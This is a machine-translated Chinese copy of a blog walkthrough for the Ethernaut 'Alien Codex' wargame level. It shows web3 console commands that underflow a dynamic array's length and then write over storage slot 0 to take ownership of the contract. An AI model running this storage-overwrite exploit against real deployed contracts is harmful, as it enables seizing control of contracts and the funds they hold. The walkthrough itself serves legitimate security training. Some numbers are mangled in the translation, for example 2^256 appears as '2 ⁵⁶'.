<html>
<head>
<title>Solving Ethernaut 19 — Alien Codex</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">解决以太19-外星人法典</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/solving-ethernaut-19-3ec869ac89be?source=collection_archive---------5-----------------------#2022-10-11">https://medium.com/coinmonks/solving-ethernaut-19-3ec869ac89be?source=collection_archive---------5-----------------------#2022-10-11</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><figure class="fi fk ir is it iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff iq"><img src="../Images/f9c20d54ef70c6e8e751797189666a17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*JPCI-2U5N8Ik5lnb"/></div></div><figcaption class="jb jc fg fe ff jd je bd b be z ek">Photo by <a class="ae jf" href="https://unsplash.com/@ikukevk?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Kevin Ku</a> on <a class="ae jf" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Unsplash</a></figcaption></figure><div class="jg jh fm fo ji jj"><a href="https://ethernaut.openzeppelin.com/" rel="noopener  ugc nofollow" target="_blank"><div class="jk ab ej"><div class="jl ab jm cl cj jn"><h2 class="bd hu fv z el jo eo ep jp er et hs dt translated">以太人</h2><div class="jq l"><p class="bd b gc z el jo eo ep jp er et ek translated">ethernaut.openzeppelin.com</p></div></div></div></a></div><p id="ed79" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">战胜这一挑战的诀窍是理解静态变量和动态数组是如何存储的。</p><p id="9999" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">目标很简单——通过覆盖“所有者”地址来要求合同。</p><h1 id="b798" class="kp kq ht bd kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm dt translated">要破解的合同</h1><figure class="ln lo lp lq fq iu"><div class="bz el l di"><div class="lr ls l"/></div></figure><p id="4883" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">您可能注意到的第一件事是,“AlienCodex”契约继承了另一个名为“Ownable”的契约，但是该契约的代码不可用。这里的“Ownable”契约是OpenZeppelin实现的早期版本，但是出于我们的目的，我们只需要知道这个契约将在存储槽中存储“所有者”地址。</p><h2 id="4c88" class="lt kq ht bd kr lu lv lw kv lx ly lz kz kc ma mb ld kg mc md lh kk me mf ll mg dt translated">智能合同中的存储机制提醒</h2><p id="d215" class="pw-post-body-paragraph jr js ht jt b ju mh jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ml km kn ko hm dt translated">契约中的所有持久状态——意味着所有变量和所有动态数组——都存储在一个32字节的长列表中。每个槽都有一个从0开始的索引，一直到索引2 ⁵⁶ -1。如果一个接一个定义的变量可以放入32个字节，那么它们可以一起放入一个存储槽中。</p><figure class="ln lo lp lq fq iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff mm"><img src="../Images/6b3340b0433cce3dc9fe2bb518629139.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*sBWjN9LLcmw0Y2-M.jpeg"/></div></div></figure><p id="299b" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">与之前的挑战一样，您需要找出一种方法，以一种意想不到的方式操纵存储插槽。</p></div><div class="ab cl mn mo hb mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="hm hn ho hp hq"><p id="367e" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">乍一看，这似乎不那么简单，但是让我们试着弄清楚变量是如何存储在我们的契约中的。在浏览器控制台中，您可以通过写入以下内容来尝试查看合同的第一个存储位置:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="0ad6" class="lt kq ht mv b fv mz na l nb nc">await web3.eth.getStorageAt(contract.address, 0);</span></pre><p id="37ec" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">您得到的结果应该是这样的:</p><figure class="ln lo lp lq fq iu fe ff paragraph-image"><div class="fe ff nd"><img src="../Images/0e46636e9125982951657f4994a7520e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1226/format:webp/1*858G84tDu9LVuTCr6rCDoQ.png"/></div></figure><p id="6a9e" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">该值是一个32字节长的十六进制字符串，最后40个字符设置为一个地址。这实际上是所有者的地址，因为即使我们在ethernaut质询提供的代码中看不到该变量，但该变量是在“Ownable”契约中定义的。变量也根据继承层次结构存储，因此从另一个协定继承的协定将其变量存储在它所继承的协定之后。在我们的例子中，这意味着所有者地址变量存储在槽0中，因为“AlienCodex”继承自“Ownable”。</p></div><div class="ab cl mn mo hb mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="hm hn ho hp hq"><p id="20cc" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">您可以尝试通过检查更多存储插槽，但您会发现插槽0以外的所有存储插槽都将以十六进制返回0。让我们看看代码，找出前进的方向。</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="445d" class="lt kq ht mv b fv mz na l nb nc">bool public contact;  <br/>bytes32[] public codex;</span><span id="fb52" class="lt kq ht mv b fv ne na l nb nc">modifier contacted() {   <br/> assert(contact);    <br/>_;<br/>}</span></pre><p id="72ed" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">我们需要做的第一件事是将contact变量改为true，否则我们将无法调用其他方法。这样做很简单。我们只需要调用这个方法:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="7991" class="lt kq ht mv b fv mz na l nb nc">function make_contact() public {    contact = true;  }</span></pre><p id="42b1" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">再次使用浏览器中的控制台:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="b2cc" class="lt kq ht mv b fv mz na l nb nc">await contract.make_contact()</span></pre><p id="495d" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">如果您在调用成功后检查存储插槽0，您可能会注意到一些奇怪的情况:</p><figure class="ln lo lp lq fq iu fe ff paragraph-image"><div class="fe ff nf"><img src="../Images/93b763c3ee03c62ab805ef4c47c73662.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*12PXaZROKut0FRScQ84o8Q.png"/></div></figure><p id="fea4" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">我们的存储槽中的地址前面现在有一个1！这个1实际上是我们刚刚在最后一个调用中设置为true的bool变量contact。原因是bool只占用1个字节，它与地址变量打包在一起，以便为契约节省存储空间。</p><p id="6970" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">既然我们可以调用契约中的其他函数，那么让我们看看我们可以做些什么来破解这个契约。你应该关注的重要方法是:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="d3ad" class="lt kq ht mv b fv mz na l nb nc">function retract() contacted public {   <br/> codex.<em class="ng">length</em>--;  <br/>}   </span><span id="4d83" class="lt kq ht mv b fv ne na l nb nc">function revise(uint i, bytes32 _content) contacted public { <br/>  codex[i] = _content;  <br/>}</span></pre><p id="c708" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">“retract”方法允许我们将动态数组“codex”缩小1，而“revise”允许我们索引插入数组。在我们继续之前，我们需要了解动态数组在存储槽中的行为。因为动态数组存储大小不确定的数据，所以EVM不能像静态变量那样将数据按顺序打包在一起。相反，阵列数据将存储在通过使用keccak256散列函数散列存储槽索引而确定的存储槽中。在控制台中，您可以这样做:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="bead" class="lt kq ht mv b fv mz na l nb nc">web3.utils.soliditySha3(web3.utils.encodePacked(1))</span></pre><p id="214a" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">我们使用槽1，因为地址和布尔值都可以放入槽0，所以数组被放入槽1。关于动态数组存储，另一件要注意的事情是，数组的长度将存储在这个存储槽中。所以，如果你看一下slot 1，你会看到它将返回0，但是如果我们改变数组的大小呢？我们可以调用“收回”功能:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="f04e" class="lt kq ht mv b fv mz na l nb nc">await contract.retract()</span></pre><p id="f0a4" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">现在再看一下存储插槽，我们看到了一些有趣的东西:</p><figure class="ln lo lp lq fq iu fe ff paragraph-image"><div class="fe ff nh"><img src="../Images/ba98556562aa067d4685d540dfa989e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*xzp-bKLZakJ3fFv77IKR8A.png"/></div></figure><p id="5eca" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">该值更改为32字节的最大可能值。通过从0中减去1，该值下溢，并绕回以表示最大可能值。</p><h1 id="2cad" class="kp kq ht bd kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm dt translated">好吧，很高兴知道，但这怎么帮助我们破解这份合同？</h1><p id="3ccb" class="pw-post-body-paragraph jr js ht jt b ju mh jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ml km kn ko hm dt translated">通过下溢数组长度，这意味着从EVM的角度来看，数组是2 ⁵⁶-1.的最大可能长度如果您还记得前面的内容，这个数字与合同中的存储槽总数相同。这意味着这个数组的索引实际上包装了<strong class="jt hu">整个契约</strong>！</p><p id="f5d9" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">如果我们把我们到目前为止学到的所有东西结合起来，我们就可以利用我们的包装数组，在任何存储插槽中插入我们想要的任何东西！</p><p id="f03f" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">有一种叫做“revise”的方法，它允许我们通过一个索引来访问数组，并在那个索引处插入一个新值。但是我们的目标是在slot 0插入我们自己的地址，那么我们应该设置哪个索引来在slot 0实际插入呢？</p><p id="93d6" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">这是我们需要知道数组从哪里开始存储数据的地方，我们使用下面的公式得出这些数据:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="a9aa" class="lt kq ht mv b fv mz na l nb nc">web3.utils.soliditySha3(web3.utils.encodePacked(1))</span></pre><p id="0649" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">要计算正确的索引，我们需要用最大可能值减去数组的存储槽索引，然后加1，这样数组索引应该正好在存储槽0上。在控制台中，我们可以计算该值:</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="3283" class="lt kq ht mv b fv mz na l nb nc">web3.utils.toBN(await web3.eth.getStorageAt(contract.address, 1)).sub(web3.utils.toBN(web3.utils.soliditySha3(web3.utils.encodePacked(1)))).add(web3.utils.toBN(1))</span></pre><figure class="ln lo lp lq fq iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff ni"><img src="../Images/7a4a647b96841832ba1e29d2454c4565.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hf16F-X6CakF9ymHRosy2Q.png"/></div></div></figure><p id="97e6" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">如果我们使用这个值作为我们的索引，我们可以在存储槽0中插入任何我们想要的东西。</p><pre class="ln lo lp lq fq mu mv mw mx aw my dt"><span id="969d" class="lt kq ht mv b fv mz na l nb nc">await contract.revise(web3.utils.encodePacked("35707666377435648211887908874984608119992236509074197713628505308453184860938"), web3.utils.padLeft("<strong class="mv hu">insert your wallet address</strong>", 64))</span></pre><p id="31cc" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">我们必须填充输入以匹配函数参数所需的32个字节，并且我们可以通过查看存储槽0:</p><figure class="ln lo lp lq fq iu fe ff paragraph-image"><div class="fe ff nj"><img src="../Images/2ff865b1be0575146a09d610e63baa1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1194/format:webp/1*9DbZHRxKlmO_PM3fC6A08Q.png"/></div></figure><p id="89b3" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">如果成功了，你将会看到你自己的地址，这使得<strong class="jt hu">现在是你</strong>的主人了！</p><p id="5076" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">不要忘记提交以完成挑战。</p><blockquote class="nk"><p id="9bb7" class="nl nm ht bd nn no np nq nr ns nt ko ek translated">交易新手？试试<a class="ae jf" rel="noopener" href="/coinmonks/crypto-trading-bot-c2ffce8acb2a">密码交易机器人</a>或<a class="ae jf" rel="noopener" href="/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c">复制交易</a></p></blockquote></div></div>    
</body>
</html>